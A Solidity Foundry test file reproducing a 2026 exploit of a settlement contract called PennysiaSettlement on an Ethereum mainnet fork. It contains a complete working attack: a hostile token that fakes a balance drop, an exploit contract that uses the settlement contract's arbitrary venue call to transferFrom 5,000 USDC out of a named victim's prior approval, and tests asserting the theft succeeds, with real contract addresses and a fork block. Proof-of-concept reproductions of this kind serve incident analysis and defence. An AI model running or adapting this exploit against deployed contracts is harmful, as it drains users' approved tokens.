// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// PennysiaSettlement arbitrary venue call (Ethereum, 2026-11-12)
//
// executeSyncAttempt calls whatever venue and calldata the caller supplies, then
// treats a drop in a caller-chosen token's balanceOf as proof that a swap spent
// something. A hostile token reports that drop after the venue call moves a
// victim's USDC into the settlement contract with transferFrom. The contract
// pays that USDC out as the swap proceeds.
//
// Fork block 26,399,313, one before the incident tx
// 0x2716c50e450272240f68f2827bcb4a336c2ac520951e0e530154566c295b732d.
// The victim already approved the settlement contract. Nothing is minted.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPennysia {
    struct Route {
        uint8 kind;
        address spendAs;
        uint256 quotedReturn;
        uint256 value;
        address venue;
        address allowanceTarget;
        uint8 approvalMode;
        bytes callData;
    }

    function swapEnabled() external view returns (bool);

    function executeSwap(
        Route[] calldata routes,
        address sellToken,
        address buyToken,
        uint256 amountIn,
        uint256 minTotalReturn,
        uint256 deadline
    ) external payable returns (uint256);
}

/// Hostile sell token. balanceOf(settlement) falls once the stolen USDC arrives,
/// so the settlement contract's spend check passes without a real swap.
contract HostileToken {
    address internal immutable settlement;
    address internal immutable usdc;
    uint256 internal immutable usdcSnap;
    mapping(address => uint256) internal bal;

    constructor(address settlement_, address usdc_) {
        settlement = settlement_;
        usdc = usdc_;
        usdcSnap = IERC20(usdc_).balanceOf(settlement_);
        bal[msg.sender] = 1;
    }

    function allowance(address, address) external pure returns (uint256) {
        return 0;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        bal[msg.sender] -= amount;
        bal[to] += amount;
        return true;
    }

    function balanceOf(address account) external view returns (uint256) {
        if (account == settlement && IERC20(usdc).balanceOf(settlement) > usdcSnap) return 0;
        return bal[account];
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        bal[from] -= amount;
        bal[to] += amount;
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }
}

contract PennysiaExploit {
    IPennysia internal constant SETTLEMENT = IPennysia(0x3Aad97E5a91b8e43b7Dc830aCEb004307678795E);
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant VICTIM = 0xF2Ff84D45783BD64913903516FA44B419F266998;
    uint256 internal constant STEAL = 5_000e6;

    function attack() external {
        HostileToken hostile = new HostileToken(address(SETTLEMENT), USDC);
        require(hostile.approve(address(SETTLEMENT), 1), "approve");
        uint256 allowed = IERC20(USDC).allowance(VICTIM, address(SETTLEMENT));
        uint256 held = IERC20(USDC).balanceOf(VICTIM);
        require(allowed >= STEAL && held >= STEAL, "victim");

        bytes memory callData =
            abi.encodeWithSelector(IERC20.transferFrom.selector, VICTIM, address(SETTLEMENT), STEAL);

        IPennysia.Route[] memory routes = new IPennysia.Route[](1);
        routes[0] = IPennysia.Route({
            kind: 0,
            spendAs: address(hostile),
            quotedReturn: STEAL,
            value: 0,
            venue: USDC,
            allowanceTarget: USDC,
            approvalMode: 0,
            callData: callData
        });

        // @> VULN: the venue call is attacker calldata, so transferFrom spends a stranger's approval
        SETTLEMENT.executeSwap(routes, address(hostile), USDC, 1, STEAL, type(uint256).max);
    }
}

contract Pennysia_exp is Test {
    IERC20 internal constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address internal constant SETTLEMENT = 0x3Aad97E5a91b8e43b7Dc830aCEb004307678795E;
    address internal constant VICTIM = 0xF2Ff84D45783BD64913903516FA44B419F266998;
    uint256 internal constant STEAL = 5_000e6;

    function setUp() public {
        string memory rpc = vm.envOr("MAINNET_RPC_URL", string("http://127.0.0.1:8545"));
        vm.createSelectFork(rpc, 26_399_313);
    }

    function testExploit() public {
        assertTrue(IPennysia(SETTLEMENT).swapEnabled(), "swaps disabled at fork");
        assertGe(USDC.allowance(VICTIM, SETTLEMENT), STEAL, "victim approval");
        assertGe(USDC.balanceOf(VICTIM), STEAL, "victim balance");

        uint256 victimBefore = USDC.balanceOf(VICTIM);
        uint256 settlementBefore = USDC.balanceOf(SETTLEMENT);

        PennysiaExploit exploit = new PennysiaExploit();
        exploit.attack();

        assertEq(USDC.balanceOf(VICTIM), victimBefore - STEAL, "victim not drained");
        assertEq(USDC.balanceOf(address(exploit)), STEAL, "attacker did not receive USDC");
        // The settlement contract pays the whole measured output to the caller.
        assertEq(USDC.balanceOf(SETTLEMENT), settlementBefore, "settlement kept the stolen USDC");
        emit log_named_decimal_uint("USDC taken from victim", STEAL, 6);
    }

    function testControlHonestTokenDoesNotPay() public {
        uint256 victimBefore = USDC.balanceOf(VICTIM);
        HonestToken honest = new HonestToken();
        honest.mint(address(this), 1);
        honest.approve(SETTLEMENT, 1);

        bytes memory callData =
            abi.encodeWithSelector(IERC20.transferFrom.selector, VICTIM, SETTLEMENT, STEAL);
        IPennysia.Route[] memory routes = new IPennysia.Route[](1);
        routes[0] = IPennysia.Route({
            kind: 0,
            spendAs: address(honest),
            quotedReturn: STEAL,
            value: 0,
            venue: address(USDC),
            allowanceTarget: address(USDC),
            approvalMode: 0,
            callData: callData
        });

        vm.expectRevert(IPennysiaErrors.AllSoftAttemptsFailed.selector);
        IPennysia(SETTLEMENT).executeSwap(routes, address(honest), address(USDC), 1, STEAL, type(uint256).max);
        assertEq(USDC.balanceOf(VICTIM), victimBefore, "honest token must not move the victim");
    }
}

interface IPennysiaErrors {
    error AllSoftAttemptsFailed();
}

contract HonestToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function allowance(address, address) external pure returns (uint256) {
        return 0;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
